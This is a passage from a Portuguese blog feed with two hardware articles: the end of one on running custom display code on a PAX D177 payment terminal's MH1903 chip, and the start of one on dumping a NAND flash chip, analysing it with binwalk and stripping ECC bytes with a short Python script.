</code></pre></div></div>

<p>Em seguida, você pode criar um novo projeto:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>my-project <span class="o">&amp;&amp;</span> <span class="nb">cd </span>my-project
pio init
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The following files/directories have been created in /tmp/m
include - Put project header files here
lib - Put project specific (private) libraries here
src - Put project source files here
platformio.ini - Project Configuration File
Project has been successfully initialized!
</code></pre></div></div>

<p>Depois disso, você pode simplesmente editar o <code class="language-plaintext highlighter-rouge">platformio.ini</code> para mapeá-lo para usar a plataforma air105:</p>

<div class="language-toml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[env:air105]</span>
<span class="py">platform</span> <span class="p">=</span> <span class="err">https://github.com/racerxdl/platformio-air</span><span class="mi">105</span>
<span class="py">board</span> <span class="p">=</span> <span class="err">mh</span><span class="mi">1903</span>
<span class="py">framework</span> <span class="p">=</span> <span class="err">baremetal</span>
<span class="py">;monitor_port</span> <span class="p">=</span> <span class="err">SERIAL_PORT</span>
<span class="py">;monitor_speed</span> <span class="p">=</span> <span class="mi">115200</span>
<span class="py">monitor_rts</span> <span class="p">=</span> <span class="mi">0</span> <span class="err">;</span> <span class="err">AIR</span><span class="mi">105</span> <span class="err">board</span> <span class="err">has</span> <span class="err">inverted</span> <span class="err">RTS</span>
<span class="py">build_flags</span> <span class="p">=</span> <span class="err">-g</span> <span class="err">-ggdb</span>
</code></pre></div></div>

<p>Você pode alterar o parâmetro <code class="language-plaintext highlighter-rouge">board</code> entre <code class="language-plaintext highlighter-rouge">mh1903</code> e <code class="language-plaintext highlighter-rouge">air105</code>, dependendo do que você está direcionando. O MH1903 é a variante de 1MB, portanto, o código travará no AIR105 devido à stack estar posicionada no final do espaço RAM.</p>

<p>E para executar:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pio run <span class="nt">-t</span> upload
</code></pre></div></div>

<p>Isso deve compilar e carregar (usando o air105-uploader) diretamente. Também irá baixar qualquer ferramenta e bibliotecas necessárias para isso. Você também pode adicionar <code class="language-plaintext highlighter-rouge">-t monitor</code> para abrir um console serial e ver o retorno da máquina.</p>

<p>O código-fonte para o framework e a plataforma nos links do platform.io estão no final deste artigo.</p>

<h2 id="magic-stuff">MAGIC STUFF</h2>

<p>Então, este artigo está ficando enorme e sinto que muitos detalhes serão mal escritos se eu continuar colocando conteúdo aqui. Afinal, este é um projeto de pesquisa de mais de 4 anos. Portanto, eventualmente escreverei mais dois artigos sobre como mapeei algumas coisas mágicas.</p>

<p>Quando digo coisas mágicas, as próximas seções deste artigo vão assumir que sabemos como o LCD está conectado à CPU, o que inicialmente supus que estava na mesma porta que a memória flash que vimos na PCB. Resumindo, está, mas não o Chip Select, nem o controle da backlight do LCD, e esses não foram triviais de encontrar, já que o pinout do LCD não é padrão e eu não consegui encontrar nenhum datasheet dele.</p>

<p>Eu emulei o firmware para descobrir algumas coisas (outras coisas foram apenas observando seções descompiladas) e a coisa mágica que descobri é que os pinos que controlam o LCD estão mapeados em um GPIO que <strong>não existe</strong> de acordo com o datasheet 😃 (Spoiler, existem <strong>dois</strong> GPIOs não documentados e algumas outras coisas)</p>

<p>Por agora, vamos apenas fingir que escrevi um bom artigo sobre como fiz isso. Prometo que escreverei um novo com detalhes sobre a engenharia reversa e os detalhes de como fiz um emulador para isso (que poderia até mostrar as imagens do LCD) 👀</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/e129a7f1554e79536be3ca8d71fe03d9_MD5.jpeg" alt="" /></p>

<h2 id="fazendo-o-crasharalho">Fazendo o “crasharalho”</h2>

<p>O “crasharalho” é um sticker que uso muito no Discord e no Telegram. No artigo inglês eu explico o que é o crasharalho, mas acho que em português, é auto explicativo hehe.</p>

<p>Fazer foi fácil, apenas criei uma imagem 160x128 no GIMP e colei o sticker lá.</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/67e6e21e4aca4b6c3ceeb47bf2b57530_MD5.jpeg" alt="" /></p>

<p>O Gimp também é bom porque pode exportar diretamente para um cabeçalho C, meio que comprimido com uma macro para realmente obter os valores de pixel R,G,B. Então foi bem fácil convertê-lo.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* GIMP header image file format (RGB): include/crasharalho.h */</span>

<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">width</span> <span class="o">=</span> <span class="mi">160</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">height</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>

<span class="cm">/* Call this macro repeatedly. After each use, the pixel data can be extracted */</span>

<span class="cp">#define HEADER_PIXEL(data,pixel) {\
pixel[0] = (((data[0] - 33) &lt;&lt; 2) | ((data[1] - 33) &gt;&gt; 4)); \
pixel[1] = ((((data[1] - 33) &amp; 0xF) &lt;&lt; 4) | ((data[2] - 33) &gt;&gt; 2)); \
pixel[2] = ((((data[2] - 33) &amp; 0x3) &lt;&lt; 6) | ((data[3] - 33))); \
data += 4; \
}
</span>
<span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">header_data</span> <span class="o">=</span>

<span class="s">")#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A"</span>

<span class="s">")#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A)#!A"</span>
<span class="p">(...)</span>
</code></pre></div></div>

<p>O LCD ST7735 que a máquina usa tem vários modos de pixel. Decidi usar RGB565, pois seria exatamente 16 bits de largura (o que dá dois bytes sobre SPI) e fácil de converter. Fui preguiçoso, então usei uma LLM local para gerar uma macro para convertê-lo, o que funcionou muito bem (eu não lembrava como converter os espaços, não tinha certeza se era apenas cortar bits ou realmente uma LUT).</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define RGB888_TO_RGB565(r, g, b) ( \
(((r) &amp; 0xF8) &lt;&lt; 8) | </span><span class="cm">/* 5 bits of red, shifted to bits 15-11 */</span><span class="cp"> \
(((g) &amp; 0xFC) &lt;&lt; 3) | </span><span class="cm">/* 6 bits of green, shifted to bits 10-5 */</span><span class="cp"> \
(((b) &amp; 0xF8) &gt;&gt; 3) </span><span class="cm">/* 5 bits of blue, shifted to bits 4-0 */</span><span class="cp"> \
)
</span></code></pre></div></div>

<p>A LLM gerou um pequeno corte, e funcionou bem. Então, deixei como estava. Depois, pude simplesmente enviá-lo diretamente no código:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="p">{</span>
        <span class="c1">// 0x2C RAMWR</span>
        <span class="n">SendCMD</span><span class="p">(</span><span class="n">LCD_SPI</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">);</span>                <span class="c1">// RAMWR</span>
        <span class="n">P15_ON</span><span class="p">;</span>
        <span class="kt">uint8_t</span> <span class="n">rgb</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
        <span class="c1">// Fill the screen with white color // 16 bit mode</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">160</span> <span class="o">*</span> <span class="mi">128</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">HEADER_PIXEL</span><span class="p">(</span><span class="n">header_data</span><span class="p">,</span> <span class="n">rgb</span><span class="p">);</span>
            <span class="kt">uint16_t</span> <span class="n">color</span> <span class="o">=</span> <span class="n">RGB888_TO_RGB565</span><span class="p">(</span><span class="n">rgb</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">rgb</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">rgb</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
            <span class="n">SendCMDParam</span><span class="p">(</span><span class="n">LCD_SPI</span><span class="p">,</span><span class="n">color</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">);</span> <span class="c1">// Send high byte</span>
            <span class="n">SendCMDParam</span><span class="p">(</span><span class="n">LCD_SPI</span><span class="p">,</span> <span class="n">color</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">);</span> <span class="c1">// Send low byte</span>
        <span class="p">}</span>
        <span class="n">P15_OFF</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>E testei no meu emulador:</p>

<p><img src="/assets/Running code in a PAX Credit Card Payment Machine/947b71be153e6405b62909b62e93385d_MD5.jpeg" alt="" /></p>

<h2 id="resultado">Resultado</h2>

<p><img src="/assets/Running code in a Credit Card Payment Machine/23c966b8036e41fe19f78b38bfa8bf73_MD5.jpeg" alt="" /></p>

<h2 id="próximos-passos">Próximos passos</h2>

<p>Rodar doom, é claro 😃 - Eu planejava fazer este artigo apenas após o doom, mas descobri que 1MB de RAM é meio baixo para o doom padrão. Vi que há uma versão RP2040 do doom que funciona muito bem, então provavelmente vou portar para esse núcleo.</p>

<p>Ainda quero fazer engenharia reversa de tudo que puder desses SoCs, já que são bastante poderosos e têm bons aceleradores que podem ser usados para outras coisas seguras. Também consegui extrair as ROMs de boot do MH1903S e do MH1903, que têm seus próprios aspectos interessantes. Quase terminei de fazer a engenharia reversa da ROM de boot do MH1903S e pretendo fazer um artigo sobre isso em breve. Parece que existem várias versões de ROMs de boot por aí (elas basicamente fazem a mesma coisa, mas têm diferentes revisões e builds). Então, se você encontrar algum dispositivo MH190x que você possa fazer JTAG ou que não tenha a assinatura de boot habilitada, me avise. Vamos fazer um arquivo de ROMs de boot 😃</p>

<h2 id="notas">Notas</h2>

<ol>
  <li>Houve um pouco de pesquisa sobre os códigos da PAX e PagBank para descobrir como eles interagem com o hardware. Nenhuma falha de segurança foi explorada e não há nada que eles possam fazer sobre a troca de CPU.</li>
  <li>Não há nada específico para o PagBank nesse caso. Qualquer D177 deve funcionar bem. O trabalho aqui <strong>não é devido a uma falha de segurança</strong>.</li>
  <li>Megahunt faz MUITO “Silicon OEM” (o AIR105 mencionado aqui é apenas um deles). Decaps devem apontar.</li>
  <li>Além da boot rom, não compartilho binários que extraí de máquinas. Não fiz engenharia reversa o suficiente para saber quais informações eles armazenam, e eles podem conter coisas que devem ser privadas. Portanto, por favor, não peça, você pode extraí-lo você mesmo. É bem fácil.</li>
  <li>Os artigos seguintes mostrarão como fiz engenharia reversa dos boot loaders, formato de imagem pax e descobri como os pinos do LCD foram mapeados.</li>
</ol>

<h3 id="links">Links</h3>

<ul>
  <li><a href="https://github.com/racerxdl/platformio-air105">https://github.com/racerxdl/platformio-air105</a> - PIO Platform for AIR105/MH1903</li>
  <li><a href="https://github.com/racerxdl/framework-megahunt">https://github.com/racerxdl/framework-megahunt</a> - PIO Framework for Megahunt devices</li>
  <li><a href="https://github.com/racerxdl/air105-uploader">https://github.com/racerxdl/air105-uploader</a> - Python script to upload using the boot rom</li>
  <li><a href="https://archive.org/details/mh-1903-s-v-1.5">https://archive.org/details/mh-1903-s-v-1.5</a> - Some usefull MH1903 datasheets</li>
  <li><a href="https://github.com/racerxdl/d177-crasharalho">https://github.com/racerxdl/d177-crasharalho</a> - Crasharalho Source Code</li>
  <li><a href="https://github.com/racerxdl/megahunt-bootroms">https://github.com/racerxdl/megahunt-bootroms</a> - Megahunt Bootroms</li>
  <li><a href="https://github.com/racerxdl/mhdumper">https://github.com/racerxdl/mhdumper</a> - Megahunt ROM Dumper Tool</li>
</ul>

<h3 id="timeline">Timeline</h3>

<ul>
  <li><strong>01/04/2025</strong> - Voltei aos trabalhos de engenharia reversa e mapeamento</li>
  <li><strong>17/06/2025</strong> - Consegui rodar o primeiro código (crasharalho)</li>
  <li><strong>22/06/2025</strong> - Terminei o artigo, mandei para revisão (técnica)</li>
  <li><strong>27/08/2025</strong> - Enviei o artigo para pag para revisão</li>
  <li><strong>28/08/2025</strong> - Aprovado pela pag para publicação</li>
  <li><strong>31/08/2025</strong> - Mais reviews, tradução, etc…</li>
  <li><strong>05/09/2025</strong> - Publicado</li>
</ul>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Payment Machines" /><category term="Flash" /><category term="PAX" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="D177" /><category term="D188" /><category term="Minizinha" /><category term="Moderninha" /><category term="Smart" /><category term="Sunmi" /><category term="TecToy" /><category term="Transire" /><category term="Megahunt" /><category term="MH1903" /><category term="Air105" /><category term="LuatOS" /><summary type="html"><![CDATA[Disclaimer]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/Running%20code%20in%20a%20PAX%20Credit%20Card%20Payment%20Machine/7383f9c5e7832856c90b25549fb08115_MD5.jpeg" /><media:content medium="image" url="https://lucasteske.dev/assets/Running%20code%20in%20a%20PAX%20Credit%20Card%20Payment%20Machine/7383f9c5e7832856c90b25549fb08115_MD5.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Análise e Decodificação de Memória Flash NAND - Revelando a Dispersão ECC em Dispositivos Desconhecidos</title><link href="https://lucasteske.dev/pt/2024/01/analise-e-decodificacao-de-memoria-flash" rel="alternate" type="text/html" title="Análise e Decodificação de Memória Flash NAND - Revelando a Dispersão ECC em Dispositivos Desconhecidos" /><published>2024-01-16T23:48:00+00:00</published><updated>2024-01-16T23:48:00+00:00</updated><id>https://lucasteske.dev/pt/2024/01/analise-e-decodificacao-de-memoria-flash</id><content type="html" xml:base="https://lucasteske.dev/pt/2024/01/analise-e-decodificacao-de-memoria-flash"><![CDATA[<h2 id="explorando-memorias-nand">Explorando memorias NAND</h2>

<p>Quando em posse de um dispositivo a qual se deseja conhecer sobre, nem sempre é trivial o acesso ao conteúdo da memória <em>flash</em>. Devido a natureza das memórias NAND, é aplicado para todo conteúdo um algorítimo de correção de erros que pode causar uma ofuscação não  intencional do conteúdo. Alguns fabricantes de processadores que controlam diretamente memórias do tipo NAND ou programadores de <em>software</em> “protegido” optam por customizar o jeito que estes algorítimos funcionam.</p>

<p>Neste artigo veremos como a estrutura básica de uma memória <em>flash</em>, por que a correção de erro existe e como identificar a dispersão do algorítimo de correção de erro usado.</p>

<h1 id="memórias-flash">Memórias Flash</h1>

<p>As memórias flash têm se destacado como a espinha dorsal do armazenamento digital na era contemporânea. Presentes em dispositivos tão variados quanto SSDs, pen drives e cartões SD, estas memórias trazem uma combinação irresistível de rapidez, durabilidade e capacidade de retenção de dados mesmo na ausência de energia.</p>

<p>Historicamente, antes da ascensão das memórias flash, os principais dispositivos de armazenamento eram baseados em mídias magnéticas, como discos rígidos e disquetes, ou em memórias do tipo <em>EPROM</em> (Erasable Programmable Read Only Memory). Enquanto as mídias magnéticas possuíam partes móveis e eram mais propensas a falhas físicas, as EPROMs necessitavam de um processo de apagamento específico, tornando a regravação de dados um processo mais lento e menos eficiente.</p>

<p>Dentro da categoria de memórias flash, encontramos diferentes variações, com as versões NOR e NAND sendo as mais predominantes. Neste artigo, focaremos nas memórias flash do tipo NAND, reconhecidas por sua alta densidade de armazenamento e amplamente utilizadas em dispositivos de armazenamento cotidianos, garantindo velocidade e confiabilidade na leitura e gravação de dados.</p>

<h2 id="anatomia-de-uma-célula-nand">Anatomia de uma Célula NAND</h2>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell.svg" alt="Célula de memória Flash" />
<em>Diagrama detalhado de uma célula NAND</em></p>

<p>No coração da tecnologia de memória flash, encontra-se a intricada arquitetura de uma célula NAND. A ilustração acima delineia os componentes fundamentais da célula: o Control Gate, o Floating Gate, camadas isolantes de óxido, juntamente com os terminais N-Type Source e N-Type Drain, todos construídos sobre um substrato do tipo-P.
Os bits são armazenados na memória flash retendo elétrons no Floating Gate.</p>

<p>Durante a operação de gravação, uma tensão é imposta sobre o Control Gate, induzindo elétrons a atravessarem a barreira de óxido e se alojarem no Floating Gate. Assim que os elétrons alcançam o Floating Gate, eles permanecem lá, denotando um estado “gravado”.
<img src="/assets/posts/analise-e-decodificacao-flash/flash-write.svg" alt="Processo de gravação em memória flash" /></p>

<p>Para ler a informação armazenada, uma tensão é aplicada ao Control Gate. Se houver elétrons no Floating Gate, eles criarão uma força de repulsão, bloqueando a passagem de elétrons do Source para o Drain. Este estado é reconhecido como um bit “0”. Contudo, se o Floating Gate estiver desocupado, a corrente elétrica circulará sem impedimentos, correspondendo a um bit “1”.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" alt="Estado programado de uma célula NAND" />
<em>Célula NAND no estado “gravado”</em></p>

<p>Finalmente, a configuração elétronica — seja sua ausência ou presença — determina se a célula está representando um bit “0” ou “1”. A imagem subsequente mostra uma célula no estado “apagado”, caracterizado pela livre circulação de elétrons entre os terminais.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell-erased.svg" alt="Estado apagado de uma célula NAND" />
<em>Célula NAND no estado “apagado”</em></p>

<h2 id="arquitetura-da-memória-nand">Arquitetura da Memória NAND</h2>

<p><img src="/assets/posts/analise-e-decodificacao-flash/nand-block.svg" alt="Estrutura de Bloco NAND Block" />
<em>Diagrama representando a organização de um bloco NAND</em></p>

<p>A memória NAND é meticulosamente organizada em uma estrutura hierárquica. Começando pela menor unidade, temos a célula. Estas células são, por sua vez, agrupadas para formar páginas. Avançando na hierarquia, múltiplas páginas são então consolidadas para constituir um bloco, como ilustrado no diagrama acima.</p>

<p>Essa disposição estrutural não é apenas por organização. Ela desempenha um papel vital na eficiência das operações da memória flash. Um detalhe importante a se considerar é que, em diversos dispositivos baseados em tecnologia flash, a operação de apagamento é executada em nível de bloco, e não em células ou páginas individuais.</p>

<p>A imagem exemplifica uma memória NAND que contém páginas de 2048 bytes de dados acrescidos de 64 bytes destinados à correção de erro, totalizando 2112 bytes por página. Estas páginas estão agrupadas em blocos que abrigam 64 páginas cada, resultando em 128K bytes de dados e 4K bytes para correção.</p>

<p>Os bytes adicionais em cada página não são meros complementos. Eles são intrínsecos à integridade da memória. Embora sejam armazenados da mesma forma que qualquer outro byte, muitas vezes são alocados para funções específicas, como paridade em algoritmos de Correção de Erros (ECC). Essa correção é indispensável, pois, durante a fabricação ou mesmo ao longo do uso, é possível que algumas células da memória NAND apresentem defeitos ou se desgastem, comprometendo a precisão dos dados armazenados. O ECC, portanto, atua como uma camada protetora, assegurando a confiabilidade dos dados mesmo diante de imperfeições na memória.</p>

<h2 id="lendo-memórias-flash">Lendo memórias Flash</h2>

<p>Ao lidar com leitura e gravação em memórias Flash, existe uma variedade de dispositivos disponíveis. Para memórias flash com encapsulamentos menos convencionais, como o BGA (Ball Grid Array), frequentemente recorro ao programador RT809H, utilizando um adaptador específico para tal encapsulamento. A memória flash em questão foi originalmente extraída de um equipamento da PAX, um modelo disponível no Mercado Livre sob a descrição “máquina de cartão”. Vale destacar que o tipo de encapsulamento dessa memória flash é BGA63, indicando um arranjo de 63 pinos no formato ball-grid-array.</p>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash_memory.jpg" alt="Memória Flash no programador universal RT809H pronto para leitura" /><em>Memória Flash no programador universal RT809H pronto para leitura</em></p>

<p>Após a extração dos dados da memória flash, um passo fundamental é a utilização da ferramenta <code class="language-plaintext highlighter-rouge">binwalk</code>. Este comando tem a função de vasculhar e listar possíveis assinaturas de arquivos conhecidos contidos no dump da memória, permitindo uma análise preliminar de seu conteúdo. Essa etapa é crucial para discernir se enfrentaremos desafios ao tentar decifrar os dados armazenados, como no caso de estarem criptografados.</p>

<p>É importante ressaltar que a imagem produzida pelo programador RT809H retrata o conteúdo da memória flash em seu estado mais puro, sem qualquer filtragem. Isso significa que os bits de paridade do ECC (Error-Correcting Code) estão inclusos. Esta característica pode introduzir nuances durante a análise, pois nem todas as assinaturas serão reconhecidas de maneira acurada, principalmente se considerarmos arquivos que podem iniciar no final de uma página de memória.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk F59L1G81MA@BGA63_1111.BIN

DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
438548        0x6B114         Base64 standard index table
<span class="o">(</span>...<span class="o">)</span>
3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
7839754       0x77A00A        uImage header, header size: 64 bytes, header CRC: 0x538F3DE9, created: 2021-05-27 08:14:51, image size: 3696472 bytes, Data Address: 0x80800000, Entry Point: 0x80800000, data CRC: 0xA22F74A5, OS: Linux, CPU: ARM, image <span class="nb">type</span>: OS Kernel Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"Linux-2.7.93.9707R"</span>
7839818       0x77A04A        Linux kernel ARM boot executable zImage <span class="o">(</span>little-endian<span class="o">)</span>
7857081       0x77E3B9        <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 <span class="o">(</span>null <span class="nb">date</span><span class="o">)</span>
<span class="o">(</span>...<span class="o">)</span>
20815882      0x13DA00A       uImage header, header size: 64 bytes, header CRC: 0xF95F6882, created: 2021-05-27 08:20:25, image size: 8185419 bytes, Data Address: 0x83800000, Entry Point: 0x83800000, data CRC: 0xE5674944, OS: Linux, CPU: ARM, image <span class="nb">type</span>: RAMDisk Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"RAMDISK-2.7.93.9707R"</span>
<span class="o">(</span>...<span class="o">)</span>
20815946      0x13DA04A       <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 2021-05-27 08:20:23
33792010      0x203A00A       uImage header, header size: 64 bytes, header CRC: 0x588DFFBC, created: 2021-05-27 08:19:13, image size: 6412038 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0x32979F1E, OS: Linux, CPU: ARM, image <span class="nb">type</span>: Firmware Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"BASE-2.7.93.9707R"</span>
33792074      0x203A04A       <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 2021-05-27 08:19:11
46768138      0x2C9A00A       UBI erase count header, version: 1, EC: 0x3, VID header offset: 0x800, data offset: 0x1000
</code></pre></div></div>

<p>A avaliação da entropia é uma técnica eficaz para detectar conteúdo criptografado ou compactado em uma memória. Quando falamos de entropia em dados, estamos nos referindo à quantidade de informação ou imprevisibilidade contida nesses dados. A ferramenta <code class="language-plaintext highlighter-rouge">binwalk</code> oferece um modo específico para medir essa entropia.</p>

<p>Arquivos que estão compactados ou criptografados tendem a exibir um padrão de dados aparentemente aleatório, resultando em uma medida de entropia que se aproxima de 1. Em contraste, arquivos “plain-text” ou dados não codificados geralmente possuem entropia significativamente mais baixa, tendendo para valores próximos de 0, pois seu conteúdo é mais previsível.</p>

<p>Para explorar essa funcionalidade no <code class="language-plaintext highlighter-rouge">binwalk</code>, utiliza-se a opção <code class="language-plaintext highlighter-rouge">-E</code>, que ativa o modo de medição de entropia. Ao executá-la, você receberá um gráfico que visualmente representará as variações de entropia ao longo do arquivo, facilitando a identificação de segmentos criptografados ou compactados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk <span class="nt">-E</span> F59L1G81MA@BGA63_1111.BIN
DECIMAL       HEXADECIMAL     ENTROPY
<span class="nt">--------------------------------------------------------------------------------</span>
0             0x0             Falling entropy edge <span class="o">(</span>0.027839<span class="o">)</span>
7880704       0x784000        Rising entropy edge <span class="o">(</span>0.995063<span class="o">)</span>
12345344      0xBC6000        Falling entropy edge <span class="o">(</span>0.000000<span class="o">)</span>
20869120      0x13E7000       Rising entropy edge <span class="o">(</span>0.997811<span class="o">)</span>
29257728      0x1BE7000       Falling entropy edge <span class="o">(</span>0.000000<span class="o">)</span>
33824768      0x2042000       Rising entropy edge <span class="o">(</span>0.999076<span class="o">)</span>
40386560      0x2684000       Falling entropy edge <span class="o">(</span>0.372003<span class="o">)</span>
47253504      0x2D10800       Falling entropy edge <span class="o">(</span>0.725862<span class="o">)</span>
62879744      0x3BF7800       Falling entropy edge <span class="o">(</span>0.737729<span class="o">)</span>
67244032      0x4021000       Rising entropy edge <span class="o">(</span>0.966013<span class="o">)</span>
67311616      0x4031800       Falling entropy edge <span class="o">(</span>0.776734<span class="o">)</span>
69611520      0x4263000       Falling entropy edge <span class="o">(</span>0.790624<span class="o">)</span>
69679104      0x4273800       Rising entropy edge <span class="o">(</span>0.972091<span class="o">)</span>
69814272      0x4294800       Falling entropy edge <span class="o">(</span>0.836573<span class="o">)</span>
70322176      0x4310800       Falling entropy edge <span class="o">(</span>0.844177<span class="o">)</span>
72689664      0x4552800       Falling entropy edge <span class="o">(</span>0.643195<span class="o">)</span>
74008576      0x4694800       Falling entropy edge <span class="o">(</span>0.783870<span class="o">)</span>
74584064      0x4721000       Falling entropy edge <span class="o">(</span>0.471472<span class="o">)</span>
75259904      0x47C6000       Falling entropy edge <span class="o">(</span>0.787818<span class="o">)</span>
76613632      0x4910800       Falling entropy edge <span class="o">(</span>0.823394<span class="o">)</span>
76748800      0x4931800       Falling entropy edge <span class="o">(</span>0.687502<span class="o">)</span>
82837504      0x4F00000       Falling entropy edge <span class="o">(</span>0.360502<span class="o">)</span>
84291584      0x5063000       Falling entropy edge <span class="o">(</span>0.775172<span class="o">)</span>
84934656      0x5100000       Falling entropy edge <span class="o">(</span>0.714603<span class="o">)</span>
95385600      0x5AF7800       Falling entropy edge <span class="o">(</span>0.788762<span class="o">)</span>
103233536     0x6273800       Falling entropy edge <span class="o">(</span>0.775540<span class="o">)</span>
104992768     0x6421000       Falling entropy edge <span class="o">(</span>0.750242<span class="o">)</span>
124475392     0x76B5800       Falling entropy edge <span class="o">(</span>0.281623<span class="o">)</span>
125253632     0x7773800       Falling entropy edge <span class="o">(</span>0.750710<span class="o">)</span>
133507072     0x7F52800       Falling entropy edge <span class="o">(</span>0.798972<span class="o">)</span>
137566208     0x8331800       Falling entropy edge <span class="o">(</span>0.768062<span class="o">)</span>
137701376     0x8352800       Falling entropy edge <span class="o">(</span>0.743758<span class="o">)</span>
</code></pre></div></div>

<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-entropy.svg" alt="Entropia da Imagem Lida" /><em>Entropia da Imagem Lida</em></p>

<p>No gráfico de entropia apresentado, as áreas de alta entropia se destacam como picos que se aproximam do valor 1 no eixo vertical. Estas regiões apontam para trechos de dados que têm uma distribuição que parece aleatória de bits, o que é típico de dados compactados ou criptografados.</p>

<p>Ao cruzar a posição destes picos com as informações fornecidas pelo comando <code class="language-plaintext highlighter-rouge">binwalk</code>, conseguimos entender a natureza destes segmentos de alta entropia. No nosso caso, os pontos de alta entropia correspondem a partes compactadas, e não a dados criptografados. Essa dedução fica clara quando vemos que o <code class="language-plaintext highlighter-rouge">binwalk</code> identificou assinaturas relacionadas a dados compactados com <em>gzip</em> nas posições indicadas.</p>

<p>O fato de reconhecer essas assinaturas mostra claramente que o conteúdo, apesar de compactado, não está criptografado. Se fosse, o <code class="language-plaintext highlighter-rouge">binwalk</code> não teria identificado essas assinaturas, pois os dados criptografados se parecem com um monte de informações aleatórias, sem padrões específicos. Então, olhando tanto o gráfico de entropia quanto as informações do <code class="language-plaintext highlighter-rouge">binwalk</code>, conseguimos uma boa ideia da estrutura e tipo dos dados na memória flash analisada.</p>

<h2 id="quando-a-dispersão-do-ecc-não-é-padrão">Quando a dispersão do ECC não é padrão</h2>

<p>Para garantir que os dados sejam acessados de forma precisa, é fundamental excluir os bits de paridade inseridos em cada página de memória. Supondo que os últimos 64 bytes de cada página sejam alocados para o ECC, podemos criar um script Python que lê os 2112 bytes (representando a página completa de memória) e grava somente os 2048 bytes correspondentes ao dado puro, desconsiderando o ECC, em um novo arquivo.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">F59L1G81MA@BGA63_1111.BIN</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">o</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">FIXEDDATA.bin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">pagesToRead</span> <span class="o">=</span> <span class="mi">65536</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">pagesToRead</span><span class="p">):</span>
  <span class="n">page</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">2112</span><span class="p">)</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">page</span><span class="p">[:</span><span class="mi">2048</span><span class="p">])</span> <span class="c1"># Nuke ECC
</span>  <span class="n">o</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="n">o</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

